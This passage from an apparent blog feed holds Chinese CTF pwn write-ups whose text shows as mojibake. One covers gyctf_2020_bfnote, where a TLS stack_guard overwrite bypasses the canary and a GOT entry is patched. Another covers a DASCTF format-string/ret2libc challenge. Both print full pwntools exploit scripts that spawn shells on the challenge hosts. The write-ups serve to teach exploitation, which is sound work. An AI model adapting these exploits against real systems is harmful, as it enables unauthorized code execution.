class="number">0</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;%21$p&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>-<span class="number">5</span>)+p64(e.plt[<span class="string">&#x27;printf&#x27;</span>]+base_addr)</span><br><span class="line">    add(<span class="number">0x60</span>,payload)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    libc_base=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x78c0f</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;/bin/sh;&#x27;</span>.ljust(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(sys_addr)</span><br><span class="line">    add(<span class="number">0x60</span>,payload)</span><br><span class="line">    </span><br><span class="line">    delete(<span class="number">1</span>)   </span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:27051&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211130916753.png" alt="image-20221113091621333"></p>]]></content>
      
      
      <categories>
          
          <category> buuåˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> UAF </tag>
            
            <tag> æ§åˆ¶å †å— </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gyctf_2020_bfnote</title>
      <link href="/posts/2d29ef23.html"/>
      <url>/posts/2d29ef23.html</url>
      
        <content type="html"><![CDATA[<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>é€šè¿‡æœ¬é¢˜çš„å­¦ä¹ ä¸æ€»ç»“æœ‰:</p><ol><li>æœ¬é¢˜ä¸starctf2018_babystackè¿™é¢˜ä¸€æ ·ï¼Œè€ƒå¯Ÿçš„éƒ½æ˜¯ç¯¡æ”¹TLSä¸­çš„stack_guardä»è€Œç»•è¿‡canaryçš„æ£€æŸ¥ï¼Œå› ä¸ºåœ¨2.23å’Œ2.27 32ä½çš„glibcé‡Œé¢ä¸»çº¿ç¨‹çš„TLSæ˜¯ä½äºmmapæ˜ å°„å‡ºæ¥çš„å†…å­˜ï¼Œå¹¶ä¸”ä½ç½®å›ºå®šå¹¶ä¸éšæœºã€‚è€Œæœ¬é¢˜å¯ä»¥é€šè¿‡æ•°ç»„ç´¢å¼•æ— é™åˆ¶ï¼Œè€Œåœ¨mmapæ˜ å°„å‡ºæ¥çš„åŒºåŸŸç²¾å‡†çš„ä¿®æ”¹æŸä¸ªå†…å­˜ï¼Œè¿™å°±ç»™äº†ç¯¡æ”¹TLSä¸­çš„stack_guardçš„æœºä¼š</li><li>æœ¬é¢˜çš„éš¾ç‚¹åœ¨äºä¹‹åç»•è¿‡canaryï¼Œæ— æ³•æ­£å¸¸çš„æ³„éœ²libcåœ°å€ï¼Œä»è€Œé€ æˆäº†ä¸€å®šéš¾åº¦ï¼Œé€šè¿‡å­¦ä¹ ç½‘ä¸Šå„ä½å¸ˆå‚…çš„wpï¼Œå‘ç°æœ¬é¢˜ä¸€å…±æœ‰ä¸‰ç§åšæ³•ï¼Œåˆ†åˆ«æ˜¯åˆ©ç”¨magic gadgetç¯¡æ”¹gotè¡¨ï¼Œret2dlä»¥åŠæ”»å‡»IO_FILEã€‚è¿™é‡Œæˆ‘é‡‡ç”¨çš„æ˜¯åˆ©ç”¨magic gadgetç¯¡æ”¹gotè¡¨</li></ol><h2 id="ä¿æŠ¤ç­–ç•¥"><a href="#ä¿æŠ¤ç­–ç•¥" class="headerlink" title="ä¿æŠ¤ç­–ç•¥"></a>ä¿æŠ¤ç­–ç•¥</h2><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281654944.png" alt="image-20221128165410736" style="zoom:50%;" /><h2 id="æ¼æ´æ‰€åœ¨"><a href="#æ¼æ´æ‰€åœ¨" class="headerlink" title="æ¼æ´æ‰€åœ¨"></a>æ¼æ´æ‰€åœ¨</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281657108.png" alt="image-20221128165734005"></p><h2 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h2><p>æˆ‘ä»¬ç°åœ¨æ‹¥æœ‰æ ˆæº¢å‡ºæ§åˆ¶æ‰§è¡Œæµçš„æœºä¼šï¼Œä»¥åŠåˆ©ç”¨ç´¢å¼•æ— é™åˆ¶ä»»æ„åœ°å€å†™çš„æœºä¼šã€‚</p><p>å…ˆè¯´å¦‚ä½•åŠ«æŒTLSé‡Œçš„stack_guardæ¥ç»•è¿‡canary</p><ol><li>å…ˆåˆ©ç”¨mallocç”³è¯·ä¸€ä¸ªè¶…å¤§å†…å­˜ï¼Œè§‚å¯Ÿä¸€ä¸‹mmapæ˜ å°„å‡ºæ¥çš„åœ°å€å’ŒTLSä¸­stack_guardçš„è·ç¦»</li><li>åœ¨æœ€åçš„æ•°ç»„ç´¢å¼•æ— é™åˆ¶çš„readé‡Œå»ç¯¡æ”¹stack_guardä¿æŒå…¶å’Œæ ˆé‡Œè¦†ç›–æ‰çš„canaryä¸€æ ·å³å¯</li></ol><p>å¦‚å›¾</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281712774.png" alt="image-20221128171243112" style="zoom:50%;" /><p>è€ƒè™‘åˆ°åœ¨æ•°ç»„é‡Œç´¢å¼•åˆè¢«åŠ äº†0x10ï¼Œæ‰€ä»¥æœ€åå®é™…çš„åç§»åº”è¯¥ä¸º0x5170c-0x10ï¼Œè¿™æ ·å³å¯ç¯¡æ”¹stack_guard(å¦‚ä¸‹)</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281714096.png" alt="image-20221128171415975"></p><p>ç”±äºæœ¬é¢˜çš„ä¿æŠ¤æ˜¯parital relroï¼Œå¯ä»¥ç¯¡æ”¹gotè¡¨ã€‚å¹¶ä¸”libcåœ°å€çš„åä¸‰ä½æ˜¯å›ºå®šä¸å˜çš„ï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥æ‰“ä¸€ä¸ªropå»readå¾€atolçš„gotè¡¨é‡Œè¯»å…¥æ•°æ®(atolå’Œsystemçš„çœŸå®åœ°å€åªæœ‰åäº”ä½ä¸ä¸€æ ·)å¦‚ä¸‹</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281718462.png" alt="image-20221128171802376" style="zoom:50%;" /><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥å»readè¯»å…¥æ•°æ®æ§åˆ¶atolçš„åä¸¤ä½ä¸ºsystemçš„åœ°å€ï¼Œæ­¤æ—¶ä¹Ÿä»…ä»…æœ‰ä¸‰ä½ä¸ä¸€æ ·äº†ï¼Œåˆ°è¿™é‡Œçˆ†ç ´ä¸€ä¸‹çš„è¯ä¹Ÿæœ‰1&#x2F;4096çš„æ¦‚ç‡(å¦‚æœå®åœ¨æ²¡åŠæ³•çš„è¯ï¼Œçˆ†ç ´ä¸€ä¸‹ä¹Ÿä¸æ˜¯ä¸è¡Œ)ã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬å»è§‚å¯Ÿä¸€ä¸‹å¯ç”¨çš„gadgetå‘ç°äº†è¿™ä¸ªincæŒ‡ä»¤(å¦‚ä¸‹)</p><blockquote><p>inc bç›¸å½“äºadd b,1ï¼Œé€Ÿåº¦æ¯”addæŒ‡ä»¤æ›´å¿«</p></blockquote><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281720294.png" alt="image-20221128172035296"></p><p>åŒæ—¶çœ‹äº†ä¸€ä¸‹å…³äºebpçš„gadgetå‘ç°èƒ½å¤Ÿæ§åˆ¶ebp(å¦‚ä¸‹)</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281722465.png" alt="image-20221128172221197"></p><p>è¿™å°±æ„å‘³ç€æˆ‘ä»¬èƒ½åˆ©ç”¨é‚£æ®µmagic gadgetæ¥è®©æŒ‡å®šçš„å†…å­˜åŠ 1ï¼Œå› ä¸ºç´§è·Ÿretçš„å­˜åœ¨ï¼Œæ‰€ä»¥èƒ½å¤Ÿä¸æ–­æ‰§è¡Œè¿™æ®µgadgetï¼Œè€Œatolå’Œsystemé™¤å»æœ«å°¾çš„ä¸‰ä½å›ºå®šå¤–ï¼Œå‰é¢çš„éƒ¨åˆ†è™½ç„¶éšæœºä½†æ˜¯å´å­˜åœ¨å›ºå®šçš„åç§»ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶ebp-0x17fa8b40ä¸ºatolå‡½æ•°çš„ç¬¬ä¸‰å­—èŠ‚çš„åœ°å€ï¼Œä¸æ–­çš„æ‰§è¡ŒincæŒ‡ä»¤ï¼Œæœ€ç»ˆåŠ åˆ°å’Œsystemä¸€æ ·çš„å€¼ã€‚</p><p>ç¯¡æ”¹æˆåŠŸåè®©æ‰§è¡Œæµè¿ç§»åˆ°0x08048656è¿™ä¸ªåœ°å€ï¼Œreadè¯»å…¥&#x2F;bin&#x2F;shè°ƒç”¨atolçš„æ—¶å€™è·å–shellã€‚</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;b&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26281&quot;</span>)</span><br><span class="line">debug(p,<span class="number">0x0804882A</span>,<span class="number">0x08048907</span>,<span class="number">0x080487BA</span>,<span class="number">0x8048973</span>)</span><br><span class="line">leave_ret=<span class="number">0x08048578</span></span><br><span class="line">inc_ebp=<span class="number">0x08048434</span></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x32</span>+p32(<span class="number">0xdeadbeef</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x0804A060</span>+<span class="number">4</span>)+p32(<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;\nGive your description : &quot;</span>,payload)</span><br><span class="line">payload=p32(<span class="number">0x080489db</span>)+p32(<span class="number">0x804a02d</span>+<span class="number">0x17fa8b40</span>)+p32(inc_ebp)*<span class="number">0xd9</span><span class="comment">#0xdb</span></span><br><span class="line">payload+=p32(e.plt[<span class="string">&#x27;read&#x27;</span>])+p32(<span class="number">0x08048656</span>)+p32(<span class="number">0</span>)+p32(e.got[<span class="string">&#x27;atol&#x27;</span>])+p32(<span class="number">0x100</span>)+p32(<span class="number">0x08048656</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Give your postscript : &quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;\nGive your notebook size : &quot;</span>,<span class="built_in">str</span>(<span class="number">0x50000</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Give your title size : &quot;</span>,<span class="built_in">str</span>(<span class="number">0x5170c</span>-<span class="number">0x10</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;invalid ! please re-enter :\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x18</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;\nGive your title : &quot;</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Give your note : &quot;</span>,p32(<span class="number">0xdeadbeef</span>))<span class="comment">#canary</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.send(<span class="string">&quot;\x40&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281741828.png" alt="image-20221128174103440"></p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://www.cnblogs.com/countfatcode/p/12425168.html">iæ˜¥ç§‹å…¬ç›Šèµ›ä¹‹BFnote - countfatcode - åšå®¢å›­ (cnblogs.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> buuåˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ ˆè¿ç§» </tag>
            
            <tag> ç¯¡æ”¹gotè¡¨ </tag>
            
            <tag> ç¯¡æ”¹TLSä¸­stack_guard </tag>
            
            <tag> ç»•è¿‡canary </tag>
            
            <tag> magic gadget </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>good_luck_2022DASCTF Apr X FATE é˜²ç–«æŒ‘æˆ˜èµ›</title>
      <link href="/posts/3aec74c5.html"/>
      <url>/posts/3aec74c5.html</url>
      
        <content type="html"><![CDATA[<h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p>é€šè¿‡è¿™é“é¢˜çš„å­¦ä¹ ä¸æ”¶è·æœ‰ï¼š</p><p>1ã€å­¦ä¹ äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¸­çš„%sæ³„éœ²å‡½æ•°åœ°å€åŸç†ä»¥åŠroderickå¸ˆå‚…å†™çš„Libcboxçš„ç”¨æ³•ï¼ˆå…¶å®ç”¨æ³•ä¹Ÿå¾ˆç®€å•äº†ï¼‰ï¼Œä¹‹åå°±æ²¡ä»€ä¹ˆäº†ç›´æ¥ret2libcå°±æ‰“äº†ã€‚</p><p>2ã€è¿™é“èµ›é¢˜æœ€ååªæœ‰ä¸‰è§£â€¦ ä¸è¿‡çœŸçš„å¾ˆç®€å•ï¼Œåšå‡ºæ¥çš„äººå¾ˆå°‘çš„åŸå› ä¼°è®¡æ˜¯å› ä¸ºè¿™é“é¢˜æ˜¯æ¯”èµ›è¿˜æœ‰ä¸åˆ°ä¸¤ä¸ªå°æ—¶ç»“æŸï¼Œæ‰æŠŠæ­£ç¡®çš„ç¨‹åºæ”¾å‡ºæ¥ï¼ˆä¹‹å‰æ”¾çš„éƒ½æ˜¯é”™è¯¯çš„â€¦ï¼‰ã€‚</p><h2 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h2><p><img src="/../img/2706180-20220424083159297-1342905454.png"></p><h2 id="ç¨‹åºåˆ†æï¼š"><a href="#ç¨‹åºåˆ†æï¼š" class="headerlink" title="ç¨‹åºåˆ†æï¼š"></a>ç¨‹åºåˆ†æï¼š</h2><p><img src="/../img/2706180-20220424083208729-652924904.png"></p><p><img src="/../img/2706180-20220424083214353-1731248574.png"></p><p>ç¨‹åºé€»è¾‘éå¸¸ç®€å•ï¼Œåˆšå¼€å§‹æ˜¯timeåŠ srandåŠ randã€‚çœ‹ä¸€ä¸‹æ±‡ç¼–ä»£ç å‘ç°æ²¡æœ‰åŠæ³•è¦†ç›–ç§å­ï¼Œå› æ­¤è¿™é‡Œç”Ÿæˆçš„å°±æ˜¯ä¸€ä¸ªä¸å¯æ§éšæœºæ•°ã€‚æ¯”èµ›åˆšå¼€å§‹çš„æ—¶å€™ï¼Œç¨‹åºæ”¾å‡ºæ¥çš„æ˜¯rand%200ï¼Œå› æ­¤è¿›å…¥fmtå’Œoverflowå‡½æ•°è¿˜éœ€è¦è¿›è¡Œçˆ†ç ´ã€‚ä¸è¿‡ç°åœ¨è¿™ä¸ªå°±éå¸¸ç®€å•äº†ï¼Œè¦ä¹ˆéšæœºæ•°æ˜¯0è¦ä¹ˆéšæœºæ•°æ˜¯1,0è¿›å…¥overflow,1è¿›å…¥fmtå‡½æ•°ã€‚</p><p><img src="/../img/2706180-20220424083219157-376928583.png"></p><p>å‘ç°è¿™ä¸¤ä¸ªå‡½æ•°éƒ½å­˜åœ¨æº¢å‡ºï¼Œå¹¶ä¸”fmtå‡½æ•°ä¸­å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚ç”±äºç¨‹åºæ²¡æœ‰å¼€canaryã€‚é‚£ç›´æ¥ret2libcï¼Ÿè¿™æ ·çš„è¯è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å²‚ä¸æ˜¯å°±æ²¡æœ‰æ„ä¹‰äº†ï¼Ÿå…ˆä¸ç®¡è¿™ä¹ˆå¤šï¼Œè„šæœ¬å†™äº†å†è¯´ã€‚</p><p>å†™å®Œä¹‹åå‘ç°æ‰“ä¸é€šï¼ˆä¹‹å‰å†™ret2libcçš„è„šæœ¬ç»™åˆ äº†ï¼Œè¿™é‡Œå°±ä¸å†å‘ˆç°äº†ï¼‰ï¼Œé€šè¿‡è°ƒè¯•å‘ç°ï¼Œpop rdiçš„åœ°å€ä¸­å‡ºç°äº†0aï¼ŒæŠŠè¾“å‡ºç»™æˆªæ–­äº†â€¦ è¿™æ„å‘³ç€æˆ‘ä»¬æ— æ³•ä½¿ç”¨ç¨‹åºé‡Œçš„pop rdiã€‚è¿™æ ·çš„è¯å°±æ²¡æ³•æ³„éœ²å‡½æ•°ï¼ˆæ¯•ç«Ÿæˆ‘ä»¬è¿rdiå¯„å­˜å™¨éƒ½æ§åˆ¶ä¸äº†ï¼‰</p><p>ç„¶åè€ƒè™‘ä¸€ä¸‹ç»™çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å®ƒæ¥æ³„éœ²æ ˆä¸­å­˜æ”¾çš„å‡½æ•°çœŸå®åœ°å€ï¼Œåˆ©ç”¨æº¢å‡ºæ¥åŠ«æŒç¨‹åºæ‰§è¡Œæµã€‚</p><p>æ³„éœ²çš„è¯æœ‰ä¸¤ç§æ–¹æ³•ï¼Œç¬¬ä¸€ç§æ˜¯ç”¨%pæ³„éœ²ï¼Œç¬¬äºŒç§æ˜¯ç”¨%sæ³„éœ²ã€‚ä¹‹å‰ä¸€ç›´ä¸æ¸…æ¥šå®ƒä»¬çš„åŒºåˆ«ï¼Œè¯·æ•™äº†roderickå¸ˆå‚…ä¹‹åæ€»ç®—æ˜¯æ¸…æ¥šäº†ã€‚</p><p>ä»¥printf(â€œ%sâ€ï¼Œâ€aaaaâ€)ä¸ºä¾‹ printfçš„ç¬¬äºŒä¸ªå‚æ•°è£…çš„å¹¶ä¸æ˜¯aaaaè¿™å››ä¸ªå­—ç¬¦ï¼Œè€Œæ˜¯aaaaå­—ç¬¦ä¸²çš„é¦–åœ°å€ã€‚å¯æ˜¯æœ€åæ‰“å°å‡ºæ¥çš„å¹¶ä¸æ˜¯aaaaå­—ç¬¦ä¸²çš„é¦–åœ°å€ï¼Œè€Œæ˜¯è¿™ä¸ªåœ°å€æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ã€‚ç”±æ­¤å¯ä»¥æ¨æ–­å‡ºï¼Œ%sæœ‰å¯»å€çš„åŠŸèƒ½ã€‚</p><h2 id="å¤§è‡´æ€è·¯ï¼š"><a href="#å¤§è‡´æ€è·¯ï¼š" class="headerlink" title="å¤§è‡´æ€è·¯ï¼š"></a>å¤§è‡´æ€è·¯ï¼š</h2><p>æ€è·¯é‡æ–°å›åˆ°æ³„éœ²æ ˆä¸­çš„å‡½æ•°çœŸå®åœ°å€ï¼Œå…ˆè¯´ç¬¬ä¸€ç§%pè¿›è¡Œæ³„éœ²ã€‚</p><p><img src="/../img/2706180-20220424083227872-1671747977.png"></p><p>æ ˆé¡¶åç§»25(0x13+6),å› æ­¤ç›´æ¥%25$på³å¯ã€‚ä¸è¿‡è¿™æ ·æ³„éœ²å‡ºæ¥çš„åœ°å€è¿˜éœ€è¦å‡å»362ï¼Œå› ä¸ºç°åœ¨å¾—åˆ°çš„æ˜¯puts+362ï¼Œè€Œæˆ‘ä»¬ä»…ä»…è¦çš„æ˜¯putsçš„çœŸå®åœ°å€ã€‚è¿™æ ·çš„ç¼ºç‚¹å°±æ˜¯ç¨‹åºpatchä¸åŒçš„libcï¼Œè¿™ä¸ªåç§»æ˜¯ä¸ä¸€æ ·çš„ã€‚ä»¥æœ¬é¢˜ä¸ºä¾‹ï¼Œé¢˜ç›®å¹¶æ²¡æœ‰ç»™å‡ºlibc.soå› æ­¤è¿™ä¸ªåç§»æˆ‘ä»¬æ˜¯æ— æ³•ç¡®å®šçš„(ç°åœ¨çœ‹åˆ°çš„åªæ˜¯æˆ‘ä»¬æœ¬åœ°çš„åç§»ï¼Œè¿œç¨‹å¯èƒ½å¹¶ä¸ä¸€æ ·)ã€‚</p><p>ä¸è¿‡è¿™ä¸ªæ–¹æ³•æœ‰ä¸€å®šçš„è¿æ°”æˆåˆ†åœ¨è¿™é‡Œé¢ï¼Œæˆ‘çŒœè¿™ä¸ªç‰ˆæœ¬ä¸ä¼šå¤ªé«˜ï¼ˆæˆ‘æœ¬æœºæ˜¯2.27çš„ï¼Œå½“æ—¶æœ¬åœ°é€šäº†è¿œç¨‹æ²¡é€šï¼Œå°±çŸ¥é“è‚¯å®šæ˜¯libc patchçš„æœ‰é—®é¢˜ï¼‰ï¼Œå°±ä»2.23å¼€å§‹patch libcã€‚ç»“æœpatchç¬¬ä¸€ä¸ª2.23-0ubuntu11.3_amd64å°±è¢«æˆ‘ç»™çŒœå¯¹äº†ï¼ˆæœåŠ¡å™¨é‚£è¾¹ç”¨çš„ä¹Ÿæ˜¯è¿™ä¸ªlibcï¼‰ã€‚</p><p>è¿™ä¸ªlibcè’™å¯¹ä¹‹åï¼Œç”±äºåŸºåœ°å€ä¹Ÿæ³„éœ²å‡ºæ¥äº†ï¼Œå‰©ä¸‹çš„å°±ç®€å•å¤šäº†ï¼Œæœ¬åœ°æ€ä¹ˆæ‰“ï¼Œè¿œç¨‹å°±æ€ä¹ˆæ‰“(ä¸è¿‡è®²è¿™ä¸ªæ–¹æ³•æ„Ÿè§‰æ²¡ä»€ä¹ˆæ„ä¹‰ï¼Œæ¯•ç«Ÿè¿™æ˜¯é è¿æ°”ï¼ˆä¸è¿‡å¦‚æœè¿œç¨‹ç»™äº†Libcçš„è¯è¿™ä¸ªæ–¹æ³•æ˜¯å¯ä»¥ç”¨çš„ï¼‰ä¸»è¦æˆ‘ç¡®å®æ˜¯ç”¨è¿™ä¸ªæ–¹æ³•æ‰“é€šäº†ï¼Œå› æ­¤è®°å½•ä¸€ä¸‹)</p><h2 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">    p = remote(<span class="string">&#x27;39.99.242.16&#x27;</span>, <span class="number">10000</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;/home/hacker/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&quot;</span>)</span><br><span class="line">    fmt_addr = <span class="number">0x400836</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;fmt\n&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;%25$p&#x27;</span> + (<span class="number">0x78</span> - <span class="number">5</span>) * <span class="string">&#x27;a&#x27;</span> + p64(fmt_addr)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    leak_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;leak_addr1---------------&gt;&#x27;</span>, <span class="built_in">hex</span>(leak_addr))</span><br><span class="line">    libc_base = leak_addr - <span class="number">362</span> - <span class="number">0x6F6A0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_base--------------&gt;&#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh_addr = libc_base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">    pop_rdi_addr = <span class="number">0x21112</span> + libc_base</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    ret = <span class="number">0x400679</span></span><br><span class="line">    payload = <span class="number">0x78</span> * <span class="string">&#x27;b&#x27;</span></span><br><span class="line">    payload+=p64(ret)+p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(sys_addr)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ‰“é€šæ¦‚ç‡æ˜¯äºŒåˆ†ä¹‹ä¸€ï¼Œå› ä¸ºå¦‚æœç¬¬ä¸€æ¬¡è¿›åˆ°overflowå°±ä¸é€šäº†ã€‚<br><img src="/../img/2706180-20220424083229618-61437671.png"></p><p>ç¬¬äºŒç§ç”¨%sæ¥æ³„éœ²å°±é è°±å¤šäº†ï¼Œæˆ‘ä»¬åœ¨æ ˆä¸­å¸ƒç½®putsçš„gotåœ°å€ï¼Œåˆ©ç”¨%sçš„å¯»å€ç‰¹å¾ï¼Œæ¥è¾¾åˆ°ç›´æ¥æ³„éœ²putsçš„çœŸå®åœ°å€ï¼ˆä¹Ÿå°±æ˜¯ä¸ä¼šå†å—libcç‰ˆæœ¬å¯¼è‡´åç§»ä¸åŒçš„å½±å“ï¼‰ï¼Œä¾æ—§åˆ©ç”¨æº¢å‡ºæ¥åŠ«æŒç¨‹åºæ‰§è¡Œæµã€‚</p><p>åªéœ€è¦è¾“å…¥%7$saaaaâ€™ + p64(puts_got_addr)ç„¶åå¡«åƒåœ¾æ•°æ®å«åˆ°è¿”å›åœ°å€å¤„åŠ«æŒæ‰§è¡Œæµå³å¯ã€‚</p><p>è¿™é‡Œæ³„éœ²æ˜¯å¾ˆæ–¹ä¾¿ï¼Œä½†æ˜¯æˆ‘ç”¨LibcSearcheræœä¸åˆ°å¯¹åº”æ­£ç¡®çš„libcç‰ˆæœ¬ã€‚å¯ä»¥ç”¨<a href="https://libc.blukat.me/?q=puts:680&l=libc6-amd64_2.10.1-0ubuntu15_i386">åœ¨çº¿æœlibcçš„ç½‘ç«™æœ</a>å¯¹åº”çš„Libcç‰ˆæœ¬</p><p>ä¹Ÿå¯ä»¥ç”¨Roderickå¸ˆå‚…å†™çš„<a href="https://github.com/RoderickChan/pwncli">pwncli</a>ä¸­çš„LibcBoxæ¥æœï¼Œè¿™ä¸ªLibcBoxå†™çš„ç¡®å®å¾ˆæ£’</p><p>ä¸‹é¢æ˜¯LibcBoxæœç´¢çš„æ•ˆæœå›¾</p><p><img src="/../img/2706180-20220424083235121-282534386.png"></p><p>å®ƒæœåˆ°äº†åä¸ªç‰ˆæœ¬çš„libcï¼Œä½†æ˜¯LibcSearcheræˆ‘è®°çš„ä»…ä»…æ˜¯æœåˆ°äº†ä¸‰ä¸ªï¼ˆä¸æ’é™¤æ˜¯æˆ‘çš„LibcSearcheræœ‰é—®é¢˜ï¼‰ã€‚</p><p>æ³„éœ²å‡ºäº†libcåŸºåœ°å€ï¼Œé‚£å°±éšä¾¿æ‰“äº†ï¼Œä¸è¿‡å¥½åƒæ²¡æ³•æœpop_rdiè¿™ä¸ªæŒ‡ä»¤ï¼ˆä¸è¿‡å¯ä»¥æŠŠlibcä¸‹è½½ä¸‹æ¥ç”¨Ropgadgetæ¥æœï¼Œä¸è¿‡æœ‰ç‚¹éº»çƒ¦ï¼‰ï¼Œå°±ç›´æ¥ç”¨one_gadgetæ‰“äº†(pwncliè¿™ä¸ªåº“æ¨¡å¼åªæ”¯æŒpython3)</p><h2 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title 